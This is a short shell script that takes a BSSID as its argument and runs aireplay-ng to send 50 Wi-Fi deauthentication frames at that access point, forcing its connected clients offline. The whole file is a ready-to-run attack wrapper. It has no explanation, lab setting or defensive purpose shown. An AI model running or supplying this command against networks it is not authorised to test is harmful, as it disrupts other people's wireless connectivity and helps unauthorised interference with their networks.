if [ $# -ne 1 ]
then
echo "Please Enter BSSID"
else
sudo aireplay-ng -0 50 -a $1 wlan0
fi
